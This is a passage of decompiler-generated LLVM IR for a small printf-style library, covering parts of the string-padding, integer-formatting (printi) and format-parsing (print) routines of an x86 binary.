  %tmp2849 = icmp slt i32 %stack_var_12.0, 1
  %tmp2950 = icmp eq i1 %tmp2849, false
  br i1 %tmp2950, label %dec_label_pc_804ea6e.lr.ph, label %dec_label_pc_804eaac.preheader

dec_label_pc_804ea6e.lr.ph:                       ; preds = %dec_label_pc_804ea85.preheader
  br label %dec_label_pc_804ea6e

dec_label_pc_804ea6e:                             ; preds = %dec_label_pc_804ea6e.lr.ph, %dec_label_pc_804ea6e
  %stack_var_-20.052 = phi i32 [ 0, %dec_label_pc_804ea6e.lr.ph ], [ %v4_804ea7f, %dec_label_pc_804ea6e ]
  %stack_var_12.151 = phi i32 [ %stack_var_12.0, %dec_label_pc_804ea6e.lr.ph ], [ %v4_804ea82, %dec_label_pc_804ea6e ]
  %v3_804ea77 = call i32 @printchar(i32* %.pre11, i32 %stack_var_-16.0)
  %v4_804ea7f = add i32 %stack_var_-20.052, 1
  %v4_804ea82 = add i32 %stack_var_12.151, -1
  %tmp28 = icmp slt i32 %v4_804ea82, 1
  %tmp29 = icmp eq i1 %tmp28, false
  br i1 %tmp29, label %dec_label_pc_804ea6e, label %dec_label_pc_804eaac.preheader

dec_label_pc_804eaac.preheader:                   ; preds = %dec_label_pc_804ea85.preheader, %dec_label_pc_804ea6e, %dec_label_pc_804ea62
  %stack_var_12.2.ph = phi i32 [ %stack_var_12.0, %dec_label_pc_804ea62 ], [ %stack_var_12.0, %dec_label_pc_804ea85.preheader ], [ %v4_804ea82, %dec_label_pc_804ea6e ]
  %stack_var_-20.1.ph = phi i32 [ 0, %dec_label_pc_804ea62 ], [ 0, %dec_label_pc_804ea85.preheader ], [ %v4_804ea7f, %dec_label_pc_804ea6e ]
  %v2_804eaaf38 = load i8, i8* %arg2, align 1
  %v4_804eab142 = icmp eq i8 %v2_804eaaf38, 0
  %v1_804eab343 = icmp eq i1 %v4_804eab142, false
  br i1 %v1_804eab343, label %dec_label_pc_804ea8d.lr.ph, label %dec_label_pc_804eace.preheader

dec_label_pc_804ea8d.lr.ph:                       ; preds = %dec_label_pc_804eaac.preheader
  %v4_804eaac37 = ptrtoint i8* %arg2 to i32
  br label %dec_label_pc_804ea8d

dec_label_pc_804ea8d:                             ; preds = %dec_label_pc_804ea8d.lr.ph, %dec_label_pc_804ea8d
  %v4_804eaac46 = phi i32 [ %v4_804eaac37, %dec_label_pc_804ea8d.lr.ph ], [ %v5_804eaa9, %dec_label_pc_804ea8d ]
  %stack_var_-20.145 = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_804ea8d.lr.ph ], [ %v4_804eaa6, %dec_label_pc_804ea8d ]
  %stack_var_8.044 = phi i8* [ %arg2, %dec_label_pc_804ea8d.lr.ph ], [ %v22_804eaa9, %dec_label_pc_804ea8d ]
  %v2_804ea90 = load i8, i8* %stack_var_8.044, align 1
  %v3_804ea90 = zext i8 %v2_804ea90 to i32
  %v3_804ea9e = call i32 @printchar(i32* %.pre11, i32 %v3_804ea90)
  %v4_804eaa6 = add i32 %stack_var_-20.145, 1
  %v5_804eaa9 = add i32 %v4_804eaac46, 1
  %v22_804eaa9 = inttoptr i32 %v5_804eaa9 to i8*
  %v2_804eaaf = load i8, i8* %v22_804eaa9, align 1
  %v4_804eab1 = icmp eq i8 %v2_804eaaf, 0
  %v1_804eab3 = icmp eq i1 %v4_804eab1, false
  br i1 %v1_804eab3, label %dec_label_pc_804ea8d, label %dec_label_pc_804eace.preheader

dec_label_pc_804eace.preheader:                   ; preds = %dec_label_pc_804ea8d, %dec_label_pc_804eaac.preheader
  %stack_var_-20.1.lcssa = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_804eaac.preheader ], [ %v4_804eaa6, %dec_label_pc_804ea8d ]
  %tmp3033 = icmp slt i32 %stack_var_12.2.ph, 1
  %tmp3134 = icmp eq i1 %tmp3033, false
  br i1 %tmp3134, label %dec_label_pc_804eab7.lr.ph, label %dec_label_pc_804ead4

dec_label_pc_804eab7.lr.ph:                       ; preds = %dec_label_pc_804eace.preheader
  br label %dec_label_pc_804eab7

dec_label_pc_804eab7:                             ; preds = %dec_label_pc_804eab7.lr.ph, %dec_label_pc_804eab7
  %stack_var_-20.236 = phi i32 [ %stack_var_-20.1.lcssa, %dec_label_pc_804eab7.lr.ph ], [ %v4_804eac8, %dec_label_pc_804eab7 ]
  %stack_var_12.335 = phi i32 [ %stack_var_12.2.ph, %dec_label_pc_804eab7.lr.ph ], [ %v4_804eacb, %dec_label_pc_804eab7 ]
  %v3_804eac0 = call i32 @printchar(i32* %.pre11, i32 %stack_var_-16.0)
  %v4_804eac8 = add i32 %stack_var_-20.236, 1
  %v4_804eacb = add i32 %stack_var_12.335, -1
  %tmp30 = icmp slt i32 %v4_804eacb, 1
  %tmp31 = icmp eq i1 %tmp30, false
  br i1 %tmp31, label %dec_label_pc_804eab7, label %dec_label_pc_804ead4

dec_label_pc_804ead4:                             ; preds = %dec_label_pc_804eab7, %dec_label_pc_804eace.preheader
  %stack_var_-20.2.lcssa = phi i32 [ %stack_var_-20.1.lcssa, %dec_label_pc_804eace.preheader ], [ %v4_804eac8, %dec_label_pc_804eab7 ]
  ret i32 %stack_var_-20.2.lcssa

; uselistorder directives
  uselistorder i32 %v5_804eaa9, { 1, 0 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %stack_var_-12.0.lcssa, { 1, 2, 0 }
  uselistorder i32 %v5_804ea2e, { 1, 2, 0 }
  uselistorder i32 %v4_804ea23, { 0, 2, 1 }
  uselistorder i32 %arg3, { 3, 1, 2, 0 }
  uselistorder i8* %arg2, { 1, 3, 2, 0, 4 }
  uselistorder label %dec_label_pc_804eab7, { 1, 0 }
  uselistorder label %dec_label_pc_804ea8d, { 1, 0 }
  uselistorder label %dec_label_pc_804eaac.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804ea6e, { 1, 0 }
  uselistorder label %dec_label_pc_804ea51, { 1, 0 }
  uselistorder label %dec_label_pc_804ea2b, { 1, 0 }
}

define i32 @printi(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i8*, align 4
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %tmp28 = call i32 @__decompiler_undefined_function_0()
  %tmp31 = call i32 @__decompiler_undefined_function_0()
  %tmp32 = call i32 @__decompiler_undefined_function_0()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-5 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v5_804eaf0 = sext i32 %tmp35 to i64
  %v4_804eaf3 = icmp eq i32 %tmp35, 0
  %v5_804eaf3 = icmp slt i32 %tmp35, 0
  %v1_804eaf7 = icmp eq i1 %v4_804eaf3, false
  br i1 %v1_804eaf7, label %dec_label_pc_804eb1e, label %dec_label_pc_804eaf9

dec_label_pc_804eaf9:                             ; preds = %entry
  store i32 48, i32* %stack_var_-16, align 4
  %tmp47 = bitcast i32* %stack_var_-16 to i8*
  %v6_804eb0e = call i32 @prints(i32 %arg1, i8* %tmp47, i32 %tmp31, i32 %tmp32)
  br label %dec_label_pc_804ebf9

dec_label_pc_804eb1e:                             ; preds = %entry
  %v4_804eb1e = icmp eq i32 %tmp28, 0
  br i1 %v4_804eb1e, label %dec_label_pc_804eb3f, label %dec_label_pc_804eb24

dec_label_pc_804eb24:                             ; preds = %dec_label_pc_804eb1e
  %v12_804eb24 = icmp eq i32 %tmp27, 10
  %v1_804eb28 = icmp eq i1 %v12_804eb24, false
  br i1 %v1_804eb28, label %dec_label_pc_804eb3f, label %dec_label_pc_804eb2a

dec_label_pc_804eb2a:                             ; preds = %dec_label_pc_804eb24
  %v1_804eb2e = icmp eq i1 %v5_804eaf3, false
  br i1 %v1_804eb2e, label %dec_label_pc_804eb3f, label %dec_label_pc_804eb30

dec_label_pc_804eb30:                             ; preds = %dec_label_pc_804eb2a
  %v1_804eb3a = sub i32 0, %tmp35
  %v5_804eb3c = sext i32 %v1_804eb3a to i64
  br label %dec_label_pc_804eb3f

dec_label_pc_804eb3f:                             ; preds = %dec_label_pc_804eb2a, %dec_label_pc_804eb24, %dec_label_pc_804eb1e, %dec_label_pc_804eb30
  %stack_var_-24.0 = phi i64 [ %v5_804eaf0, %dec_label_pc_804eb1e ], [ %v5_804eaf0, %dec_label_pc_804eb24 ], [ %v5_804eaf0, %dec_label_pc_804eb2a ], [ %v5_804eb3c, %dec_label_pc_804eb30 ]
  %stack_var_-32.0 = phi i32 [ 0, %dec_label_pc_804eb1e ], [ 0, %dec_label_pc_804eb24 ], [ 0, %dec_label_pc_804eb2a ], [ 1, %dec_label_pc_804eb30 ]
  %v15_804eb42 = ptrtoint i32* %stack_var_-5 to i32
  %tmp48 = bitcast i32* %stack_var_-5 to i8*
  store i8* %tmp48, i8** %stack_var_-40, align 4
  store i8 0, i8* %tmp48, align 4
  %v4_804eba07 = trunc i64 %stack_var_-24.0 to i32
  %v5_804eba08 = icmp eq i32 %v4_804eba07, 0
  %v1_804eba415 = icmp eq i1 %v5_804eba08, false
  br i1 %v1_804eba415, label %dec_label_pc_804eb50.lr.ph, label %dec_label_pc_804eba6

dec_label_pc_804eb50.lr.ph:                       ; preds = %dec_label_pc_804eb3f
  %v5_804eb53 = sext i32 %tmp27 to i64
  br label %dec_label_pc_804eb50

dec_label_pc_804eb50:                             ; preds = %dec_label_pc_804eb50.lr.ph, %dec_label_pc_804eb78
  %v3_804eb7818 = phi i8* [ %tmp48, %dec_label_pc_804eb50.lr.ph ], [ %v22_804eb78, %dec_label_pc_804eb78 ]
  %stack_var_-24.116 = phi i64 [ %stack_var_-24.0, %dec_label_pc_804eb50.lr.ph ], [ %v5_804eb9d, %dec_label_pc_804eb78 ]
  %v6_804eb5e = and i64 %stack_var_-24.116, 4294967295
  %v12_804eb5e = udiv i64 %v6_804eb5e, %v5_804eb53
  %v13_804eb5e = trunc i64 %v12_804eb5e to i32
  %v14_804eb5e = urem i64 %v6_804eb5e, %v5_804eb53
  %v5_804eb63 = trunc i64 %v14_804eb5e to i8
  %v7_804eb6a = icmp sgt i8 %v5_804eb63, 9
  br i1 %v7_804eb6a, label %dec_label_pc_804eb6c, label %dec_label_pc_804eb78

dec_label_pc_804eb6c:                             ; preds = %dec_label_pc_804eb50
  %tmp52 = trunc i64 %v14_804eb5e to i32
  %v5_804eb6f = add i32 %tmp52, %tmp
  %v1_804eb72 = add i32 %v5_804eb6f, 198
  %v11_804eb72 = trunc i32 %v1_804eb72 to i8
  br label %dec_label_pc_804eb78

dec_label_pc_804eb78:                             ; preds = %dec_label_pc_804eb50, %dec_label_pc_804eb6c
  %stack_var_-36.0 = phi i8 [ %v11_804eb72, %dec_label_pc_804eb6c ], [ %v5_804eb63, %dec_label_pc_804eb50 ]
  %v4_804eb78 = ptrtoint i8* %v3_804eb7818 to i32
  %v5_804eb78 = add i32 %v4_804eb78, -1
  %v22_804eb78 = inttoptr i32 %v5_804eb78 to i8*
  %v1_804eb7e = add i8 %stack_var_-36.0, 48
  store i8 %v1_804eb7e, i8* %v22_804eb78, align 1
  %v5_804eb9d = sext i32 %v13_804eb5e to i64
  %v5_804eba0 = icmp eq i32 %v13_804eb5e, 0
  %v1_804eba4 = icmp eq i1 %v5_804eba0, false
  br i1 %v1_804eba4, label %dec_label_pc_804eb50, label %dec_label_pc_804eba0.dec_label_pc_804eba6_crit_edge

dec_label_pc_804eba0.dec_label_pc_804eba6_crit_edge: ; preds = %dec_label_pc_804eb78
  store i8* %v22_804eb78, i8** %stack_var_-40, align 4
  br label %dec_label_pc_804eba6

dec_label_pc_804eba6:                             ; preds = %dec_label_pc_804eba0.dec_label_pc_804eba6_crit_edge, %dec_label_pc_804eb3f
  %v3_804ebe3622 = phi i32 [ %v5_804eb78, %dec_label_pc_804eba0.dec_label_pc_804eba6_crit_edge ], [ %v15_804eb42, %dec_label_pc_804eb3f ]
  %v3_804ebd4 = phi i8* [ %v22_804eb78, %dec_label_pc_804eba0.dec_label_pc_804eba6_crit_edge ], [ %tmp48, %dec_label_pc_804eb3f ]
  %v4_804eba6 = icmp eq i32 %stack_var_-32.0, 0
  br i1 %v4_804eba6, label %dec_label_pc_804ebdd, label %dec_label_pc_804ebac

dec_label_pc_804ebac:                             ; preds = %dec_label_pc_804eba6
  %v4_804ebac = icmp eq i32 %tmp31, 0
  br i1 %v4_804ebac, label %dec_label_pc_804ebd4, label %dec_label_pc_804ebb2

dec_label_pc_804ebb2:                             ; preds = %dec_label_pc_804ebac
  %v1_804ebb5 = and i32 %tmp32, 2
  %v2_804ebb5 = icmp eq i32 %v1_804ebb5, 0
  br i1 %v2_804ebb5, label %dec_label_pc_804ebd4, label %dec_label_pc_804ebbc

dec_label_pc_804ebbc:                             ; preds = %dec_label_pc_804ebb2
  %v3_804ebc4 = inttoptr i32 %arg1 to i32*
  %v4_804ebc4 = call i32 @printchar(i32* %v3_804ebc4, i32 45)
  %v4_804ebcf = add i32 %tmp31, -1
  br label %dec_label_pc_804ebdd

dec_label_pc_804ebd4:                             ; preds = %dec_label_pc_804ebb2, %dec_label_pc_804ebac
  %v4_804ebd4 = ptrtoint i8* %v3_804ebd4 to i32
  %v5_804ebd4 = add i32 %v4_804ebd4, -1
  %v22_804ebd4 = inttoptr i32 %v5_804ebd4 to i8*
  store i8* %v22_804ebd4, i8** %stack_var_-40, align 4
  store i8 45, i8* %v22_804ebd4, align 1
  %.phi.trans.insert = bitcast i8** %stack_var_-40 to i32*
  %v3_804ebe36.pre = load i32, i32* %.phi.trans.insert, align 4
  br label %dec_label_pc_804ebdd

dec_label_pc_804ebdd:                             ; preds = %dec_label_pc_804eba6, %dec_label_pc_804ebbc, %dec_label_pc_804ebd4
  %v3_804ebe36 = phi i32 [ %v3_804ebe3622, %dec_label_pc_804eba6 ], [ %v3_804ebe36.pre, %dec_label_pc_804ebd4 ], [ %v3_804ebe3622, %dec_label_pc_804ebbc ]
  %stack_var_20.0 = phi i32 [ %tmp31, %dec_label_pc_804eba6 ], [ %tmp31, %dec_label_pc_804ebd4 ], [ %v4_804ebcf, %dec_label_pc_804ebbc ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_804eba6 ], [ 0, %dec_label_pc_804ebd4 ], [ 1, %dec_label_pc_804ebbc ]
  %v1_804ebe9.cast = inttoptr i32 %v3_804ebe36 to i8*
  %v6_804ebe9 = call i32 @prints(i32 %arg1, i8* %v1_804ebe9.cast, i32 %stack_var_20.0, i32 %tmp32)
  %v2_804ebf4 = add i32 %v6_804ebe9, %stack_var_-28.0
  store i32 %v2_804ebf4, i32* @edx, align 4
  br label %dec_label_pc_804ebf9

dec_label_pc_804ebf9:                             ; preds = %dec_label_pc_804eaf9, %dec_label_pc_804ebdd
  %storemerge = phi i32 [ %v2_804ebf4, %dec_label_pc_804ebdd ], [ %v6_804eb0e, %dec_label_pc_804eaf9 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %v22_804eb78, { 0, 1, 3, 2 }
  uselistorder i8 %v5_804eb63, { 1, 0 }
  uselistorder i64 %v6_804eb5e, { 1, 0 }
  uselistorder i32 %tmp35, { 3, 1, 2, 0 }
  uselistorder i32 %tmp32, { 0, 2, 1 }
  uselistorder i32 %tmp31, { 2, 4, 1, 3, 0 }
  uselistorder i32 %tmp27, { 1, 0 }
  uselistorder i8** %stack_var_-40, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ebf9, { 1, 0 }
  uselistorder label %dec_label_pc_804ebdd, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804eb78, { 1, 0 }
  uselistorder label %dec_label_pc_804eb50, { 1, 0 }
  uselistorder label %dec_label_pc_804eb3f, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-6 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ebfe = load i32, i32* @ebp, align 4
  store i32 %v0_804ebfe, i32* %stack_var_-4, align 4
  %v4_804ebfe = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804ebfe, i32* @ebp, align 4
  %v15_804ec01 = ptrtoint i32* %stack_var_-44 to i32
  %v2_804edf3 = ptrtoint i32* %stack_var_-6 to i32
  %stack_var_8.450 = inttoptr i32 %arg2 to i8*
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_804ee2951 = load i8, i8* %stack_var_8.450, align 1
  %v3_804ee2952 = zext i8 %v2_804ee2951 to i32
  %v5_804ee2953 = and i32 %arg2, -256
  %v6_804ee2954 = or i32 %v3_804ee2952, %v5_804ee2953
  store i32 %v6_804ee2954, i32* %eax.global-to-local, align 4
  %v4_804ee2b55 = icmp eq i8 %v2_804ee2951, 0
  %v1_804ee2d56 = icmp eq i1 %v4_804ee2b55, false
  br i1 %v1_804ee2d56, label %dec_label_pc_804ec10, label %dec_label_pc_804ee33

dec_label_pc_804ec10:                             ; preds = %entry, %dec_label_pc_804ee23
  %v0_804ee11 = phi i32 [ %v4_804ecd572, %dec_label_pc_804ee23 ], [ %v15_804ec01, %entry ]
  %v5_804ee2962 = phi i32 [ %v5_804ee29, %dec_label_pc_804ee23 ], [ %v5_804ee2953, %entry ]
  %stack_var_8.461 = phi i8* [ %stack_var_8.4, %dec_label_pc_804ee23 ], [ %stack_var_8.450, %entry ]
  %stack_var_-28.160 = phi i32 [ %stack_var_-28.0, %dec_label_pc_804ee23 ], [ 0, %entry ]
  %stack_var_8.4.in59 = phi i32 [ %v5_804ee23, %dec_label_pc_804ee23 ], [ %arg2, %entry ]
  %stack_var_12.158 = phi i32 [ %stack_var_12.0, %dec_label_pc_804ee23 ], [ %arg3, %entry ]
  %stack_var_-24.157 = phi i32 [ %stack_var_-24.0, %dec_label_pc_804ee23 ], [ %tmp5, %entry ]
  store i32 %stack_var_8.4.in59, i32* %eax.global-to-local, align 4
  %v2_804ec13 = load i8, i8* %stack_var_8.461, align 1
  %v3_804ec13 = zext i8 %v2_804ec13 to i32
  %v6_804ec13 = or i32 %v3_804ec13, %v5_804ee2962
  store i32 %v6_804ec13, i32* %eax.global-to-local, align 4
  %v10_804ec15 = icmp eq i8 %v2_804ec13, 37
  %v1_804ec17 = icmp eq i1 %v10_804ec15, false
  br i1 %v1_804ec17, label %dec_label_pc_804ee07, label %dec_label_pc_804ec1d

dec_label_pc_804ec1d:                             ; preds = %dec_label_pc_804ec10
  %v5_804ec1d = add i32 %stack_var_8.4.in59, 1
  %v22_804ec1d = inttoptr i32 %v5_804ec1d to i8*
  store i32 %v5_804ec1d, i32* %eax.global-to-local, align 4
  %v2_804ec30 = load i8, i8* %v22_804ec1d, align 1
  %v3_804ec30 = zext i8 %v2_804ec30 to i32
  %v5_804ec30 = and i32 %v5_804ec1d, -256
  %v6_804ec30 = or i32 %v3_804ec30, %v5_804ec30
  store i32 %v6_804ec30, i32* %eax.global-to-local, align 4
  %v4_804ec32 = icmp eq i8 %v2_804ec30, 0
  br i1 %v4_804ec32, label %dec_label_pc_804ee33, label %dec_label_pc_804ec3a

dec_label_pc_804ec3a:                             ; preds = %dec_label_pc_804ec1d
  store i32 %v5_804ec1d, i32* %eax.global-to-local, align 4
  %v2_804ec3d = load i8, i8* %v22_804ec1d, align 1
  %v3_804ec3d = zext i8 %v2_804ec3d to i32
  %v6_804ec3d = or i32 %v3_804ec3d, %v5_804ec30
  store i32 %v6_804ec3d, i32* %eax.global-to-local, align 4
  %v10_804ec3f = icmp eq i8 %v2_804ec3d, 37
  br i1 %v10_804ec3f, label %dec_label_pc_804ee07, label %dec_label_pc_804ec47

dec_label_pc_804ec47:                             ; preds = %dec_label_pc_804ec3a
  store i32 %v5_804ec1d, i32* %eax.global-to-local, align 4
  %v2_804ec4a = load i8, i8* %v22_804ec1d, align 1
  %v3_804ec4a = zext i8 %v2_804ec4a to i32
  %v6_804ec4a = or i32 %v3_804ec4a, %v5_804ec30
  store i32 %v6_804ec4a, i32* %eax.global-to-local, align 4
  %v10_804ec4c = icmp eq i8 %v2_804ec4a, 45
  %v1_804ec4e = icmp eq i1 %v10_804ec4c, false
  br i1 %v1_804ec4e, label %dec_label_pc_804ec63.preheader, label %dec_label_pc_804ec50

dec_label_pc_804ec50:                             ; preds = %dec_label_pc_804ec47
  %v5_804ec50 = add i32 %stack_var_8.4.in59, 2
  %v22_804ec50 = inttoptr i32 %v5_804ec50 to i8*
  br label %dec_label_pc_804ec63.preheader

dec_label_pc_804ec63.preheader:                   ; preds = %dec_label_pc_804ec50, %dec_label_pc_804ec47
  %stack_var_8.0.ph = phi i8* [ %v22_804ec1d, %dec_label_pc_804ec47 ], [ %v22_804ec50, %dec_label_pc_804ec50 ]
  %stack_var_-32.0.ph = phi i32 [ 0, %dec_label_pc_804ec47 ], [ 1, %dec_label_pc_804ec50 ]
  %v4_804ec6315 = ptrtoint i8* %stack_var_8.0.ph to i32
  store i32 %v4_804ec6315, i32* %eax.global-to-local, align 4
  %v2_804ec6616 = load i8, i8* %stack_var_8.0.ph, align 1
  %v3_804ec6617 = zext i8 %v2_804ec6616 to i32
  %v5_804ec6618 = and i32 %v4_804ec6315, -256
  %v6_804ec6619 = or i32 %v3_804ec6617, %v5_804ec6618
  store i32 %v6_804ec6619, i32* %eax.global-to-local, align 4
  %v7_804ec6824 = icmp eq i8 %v2_804ec6616, 48
  br i1 %v7_804ec6824, label %dec_label_pc_804ec5c, label %dec_label_pc_804ec92.preheader

dec_label_pc_804ec5c:                             ; preds = %dec_label_pc_804ec63.preheader, %dec_label_pc_804ec5c
  %v4_804ec6326 = phi i32 [ %v5_804ec5c, %dec_label_pc_804ec5c ], [ %v4_804ec6315, %dec_label_pc_804ec63.preheader ]
  %stack_var_-32.025 = phi i32 [ %v4_804ec5f, %dec_label_pc_804ec5c ], [ %stack_var_-32.0.ph, %dec_label_pc_804ec63.preheader ]
  %v5_804ec5c = add i32 %v4_804ec6326, 1
  %v22_804ec5c = inttoptr i32 %v5_804ec5c to i8*
  %v4_804ec5f = or i32 %stack_var_-32.025, 2
  store i32 %v5_804ec5c, i32* %eax.global-to-local, align 4
  %v2_804ec66 = load i8, i8* %v22_804ec5c, align 1
  %v3_804ec66 = zext i8 %v2_804ec66 to i32
  %v5_804ec66 = and i32 %v5_804ec5c, -256
  %v6_804ec66 = or i32 %v3_804ec66, %v5_804ec66
  store i32 %v6_804ec66, i32* %eax.global-to-local, align 4
  %v7_804ec68 = icmp eq i8 %v2_804ec66, 48
  br i1 %v7_804ec68, label %dec_label_pc_804ec5c, label %dec_label_pc_804ec92.preheader

dec_label_pc_804ec92.preheader:                   ; preds = %dec_label_pc_804ec5c, %dec_label_pc_804ec63.preheader
  %stack_var_-32.0.lcssa = phi i32 [ %stack_var_-32.0.ph, %dec_label_pc_804ec63.preheader ], [ %v4_804ec5f, %dec_label_pc_804ec5c ]
  %stack_var_8.0.lcssa = phi i8* [ %stack_var_8.0.ph, %dec_label_pc_804ec63.preheader ], [ %v22_804ec5c, %dec_label_pc_804ec5c ]
  %v4_804ec9228 = ptrtoint i8* %stack_var_8.0.lcssa to i32
  store i32 %v4_804ec9228, i32* %eax.global-to-local, align 4
  %v2_804ec9529 = load i8, i8* %stack_var_8.0.lcssa, align 1
  %v3_804ec9530 = zext i8 %v2_804ec9529 to i32
  %v5_804ec9531 = and i32 %v4_804ec9228, -256
  %v6_804ec9532 = or i32 %v3_804ec9530, %v5_804ec9531
  store i32 %v6_804ec9532, i32* %eax.global-to-local, align 4
  %tmp73 = icmp ult i8 %v2_804ec9529, 48
  br i1 %tmp73, label %dec_label_pc_804eca4, label %dec_label_pc_804ec9b

dec_label_pc_804ec6e:                             ; preds = %dec_label_pc_804ec9b
  %v2_804ec77 = mul i32 %stack_var_-36.038, 10
  store i32 %v4_804ec9240, i32* %eax.global-to-local, align 4
  %v2_804ec7f = load i8, i8* %stack_var_8.139, align 1
  %v3_804ec7f = zext i8 %v2_804ec7f to i32
  %v5_804ec86 = add i32 %v3_804ec7f, %v2_804ec77
  %v1_804ec89 = add i32 %v5_804ec86, -48
  %v5_804ec8f = add i32 %v4_804ec9240, 1
  %v22_804ec8f = inttoptr i32 %v5_804ec8f to i8*
  store i32 %v5_804ec8f, i32* %eax.global-to-local, align 4
  %v2_804ec95 = load i8, i8* %v22_804ec8f, align 1
  %v3_804ec95 = zext i8 %v2_804ec95 to i32
  %v5_804ec95 = and i32 %v5_804ec8f, -256
  %v6_804ec95 = or i32 %v3_804ec95, %v5_804ec95
  store i32 %v6_804ec95, i32* %eax.global-to-local, align 4
  %tmp74 = icmp ult i8 %v2_804ec95, 48
  br i1 %tmp74, label %dec_label_pc_804eca4, label %dec_label_pc_804ec9b

dec_label_pc_804ec9b:                             ; preds = %dec_label_pc_804ec92.preheader, %dec_label_pc_804ec6e
  %v5_804ec9541 = phi i32 [ %v5_804ec95, %dec_label_pc_804ec6e ], [ %v5_804ec9531, %dec_label_pc_804ec92.preheader ]
  %v4_804ec9240 = phi i32 [ %v5_804ec8f, %dec_label_pc_804ec6e ], [ %v4_804ec9228, %dec_label_pc_804ec92.preheader ]
  %stack_var_8.139 = phi i8* [ %v22_804ec8f, %dec_label_pc_804ec6e ], [ %stack_var_8.0.lcssa, %dec_label_pc_804ec92.preheader ]
  %stack_var_-36.038 = phi i32 [ %v1_804ec89, %dec_label_pc_804ec6e ], [ 0, %dec_label_pc_804ec92.preheader ]
  store i32 %v4_804ec9240, i32* %eax.global-to-local, align 4
  %v2_804ec9e = load i8, i8* %stack_var_8.139, align 1
  %v3_804ec9e = zext i8 %v2_804ec9e to i32
  %v6_804ec9e = or i32 %v3_804ec9e, %v5_804ec9541
  store i32 %v6_804ec9e, i32* %eax.global-to-local, align 4
  %tmp75 = icmp ult i8 %v2_804ec9e, 58
  br i1 %tmp75, label %dec_label_pc_804ec6e, label %dec_label_pc_804eca4

dec_label_pc_804eca4:                             ; preds = %dec_label_pc_804ec6e, %dec_label_pc_804ec9b, %dec_label_pc_804ec92.preheader
  %stack_var_-36.0.lcssa = phi i32 [ 0, %dec_label_pc_804ec92.preheader ], [ %stack_var_-36.038, %dec_label_pc_804ec9b ], [ %v1_804ec89, %dec_label_pc_804ec6e ]
  %stack_var_8.1.lcssa = phi i8* [ %stack_var_8.0.lcssa, %dec_label_pc_804ec92.preheader ], [ %stack_var_8.139, %dec_label_pc_804ec9b ], [ %v22_804ec8f, %dec_label_pc_804ec6e ]
  %v4_804ec92.lcssa = phi i32 [ %v4_804ec9228, %dec_label_pc_804ec92.preheader ], [ %v4_804ec9240, %dec_label_pc_804ec9b ], [ %v5_804ec8f, %dec_label_pc_804ec6e ]
  %v5_804ec95.lcssa = phi i32 [ %v5_804ec9531, %dec_label_pc_804ec92.preheader ], [ %v5_804ec9541, %dec_label_pc_804ec9b ], [ %v5_804ec95, %dec_label_pc_804ec6e ]
  store i32 %v4_804ec92.lcssa, i32* %eax.global-to-local, align 4
  %v2_804eca7 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_804eca7 = zext i8 %v2_804eca7 to i32
  %v6_804eca7 = or i32 %v3_804eca7, %v5_804ec95.lcssa
  store i32 %v6_804eca7, i32* %eax.global-to-local, align 4
  %v10_804eca9 = icmp eq i8 %v2_804eca7, 115
  %v1_804ecab = icmp eq i1 %v10_804eca9, false
  br i1 %v1_804ecab, label %dec_label_pc_804ecef, label %dec_label_pc_804ecad

dec_label_pc_804ecad:                             ; preds = %dec_label_pc_804eca4
  store i32 %stack_var_12.158, i32* @edx, align 4
  %v1_804ecb0 = add i32 %stack_var_12.158, 4
  store i32 %stack_var_12.158, i32* %eax.global-to-local, align 4
  %v1_804ecb8 = inttoptr i32 %stack_var_12.158 to i32*
  %v2_804ecb8 = load i32, i32* %v1_804ecb8, align 4
  store i32 %v2_804ecb8, i32* %eax.global-to-local, align 4
  %v4_804ecbd = icmp eq i32 %v2_804ecb8, 0
  br i1 %v4_804ecbd, label %dec_label_pc_804ecd2, label %dec_label_pc_804ecc3

dec_label_pc_804ecc3:                             ; preds = %dec_label_pc_804ecad
  store i32 %v2_804ecb8, i32* %eax.global-to-local, align 4
  %v5_804ecc6 = inttoptr i32 %v2_804ecb8 to i8*
  br label %dec_label_pc_804ecd2

dec_label_pc_804ecd2:                             ; preds = %dec_label_pc_804ecad, %dec_label_pc_804ecc3
  %storemerge = phi i8* [ %v5_804ecc6, %dec_label_pc_804ecc3 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_806a04e.248, i32 0, i32 0), %dec_label_pc_804ecad ]
  %v4_804ecd2 = ptrtoint i8* %storemerge to i32
  store i32 %v4_804ecd2, i32* %eax.global-to-local, align 4
  %v5_804ecd5 = add i32 %v0_804ee11, -4
  %v6_804ecd5 = inttoptr i32 %v5_804ecd5 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_804ecd5, align 4
  %v5_804ecd8 = add i32 %v0_804ee11, -8
  %v6_804ecd8 = inttoptr i32 %v5_804ecd8 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_804ecd8, align 4
  %v0_804ecdb = load i32, i32* %eax.global-to-local, align 4
  %v2_804ecdb = add i32 %v0_804ee11, -12
  %v3_804ecdb = inttoptr i32 %v2_804ecdb to i32*
  store i32 %v0_804ecdb, i32* %v3_804ecdb, align 4
  %v5_804ecdc = add i32 %v0_804ee11, -16
  %v6_804ecdc = inttoptr i32 %v5_804ecdc to i32*
